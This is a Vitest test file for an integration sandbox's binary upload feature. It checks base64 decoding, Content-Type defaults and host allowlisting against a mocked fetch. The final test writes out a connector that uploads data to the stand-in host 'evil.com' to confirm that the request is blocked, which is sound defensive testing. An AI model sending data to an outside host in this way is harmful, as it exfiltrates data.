import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

import { executeIntegrationImpl } from '../execute_integration_impl';

describe('binaryBody support in HTTP methods', () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = Object.assign(
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ ok: true }), {
          status: 200,
          statusText: 'OK',
          headers: { 'content-type': 'application/json' },
        }),
      ),
      { preconnect: vi.fn() },
    );
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it('should decode base64 binaryBody and send as Blob', async () => {
    const code = `
      var connector = {
        operations: ['upload_binary'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.put('https://api.example.com/upload', {
            headers: { 'Content-Type': 'application/octet-stream' },
            binaryBody: 'SGVsbG8gV29ybGQ='
          });
          return { status: response.status };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'upload_binary',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ status: 200 });

    expect(globalThis.fetch).toHaveBeenCalledWith(
      'https://api.example.com/upload',
      expect.objectContaining({
        method: 'PUT',
        body: expect.any(Blob),
      }),
    );

    // Verify the decoded bytes match "Hello World"
    const fetchCall = vi.mocked(globalThis.fetch).mock.calls[0];
    // oxlint-disable-next-line typescript/no-unsafe-type-assertion -- test mock access
    const body = (fetchCall[1] as RequestInit).body as Blob;
    const decoded = new TextDecoder().decode(await body.arrayBuffer());
    expect(decoded).toBe('Hello World');
  });

  it('should not set default Content-Type when binaryBody is used', async () => {
    const code = `
      var connector = {
        operations: ['upload'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.post('https://api.example.com/upload', {
            binaryBody: 'AQID'
          });
          return { status: response.status };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'upload',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);

    const fetchCall = vi.mocked(globalThis.fetch).mock.calls[0];
    // oxlint-disable-next-line typescript/no-unsafe-type-assertion -- test mock access
    const options = fetchCall[1] as RequestInit;
    // oxlint-disable-next-line typescript/no-unsafe-type-assertion -- test mock access
    const headers = options.headers as Record<string, string>;
    expect(headers['Content-Type']).toBeUndefined();
  });

  it('should allow custom Content-Type with binaryBody', async () => {
    const code = `
      var connector = {
        operations: ['upload'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.post('https://api.example.com/upload', {
            headers: { 'Content-Type': 'image/png' },
            binaryBody: 'AQID'
          });
          return { status: response.status };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'upload',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);

    const fetchCall = vi.mocked(globalThis.fetch).mock.calls[0];
    // oxlint-disable-next-line typescript/no-unsafe-type-assertion -- test mock access
    const options = fetchCall[1] as RequestInit;
    // oxlint-disable-next-line typescript/no-unsafe-type-assertion -- test mock access
    const headers = options.headers as Record<string, string>;
    expect(headers['Content-Type']).toBe('image/png');
  });

  it('should use text body when binaryBody is not set', async () => {
    const code = `
      var connector = {
        operations: ['post_json'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.post('https://api.example.com/data', {
            body: JSON.stringify({ key: 'value' })
          });
          return { status: response.status };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'post_json',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);

    expect(globalThis.fetch).toHaveBeenCalledWith(
      'https://api.example.com/data',
      expect.objectContaining({
        method: 'POST',
        headers: expect.objectContaining({
          'Content-Type': 'application/json',
        }),
        body: '{"key":"value"}',
      }),
    );
  });

  it('should enforce allowedHosts for binary requests', async () => {
    const code = `
      var connector = {
        operations: ['upload'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var response = ctx.http.put('https://evil.com/upload', {
            binaryBody: 'AQID'
          });
          return { status: response.status };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'upload',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('blocked');
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });
});
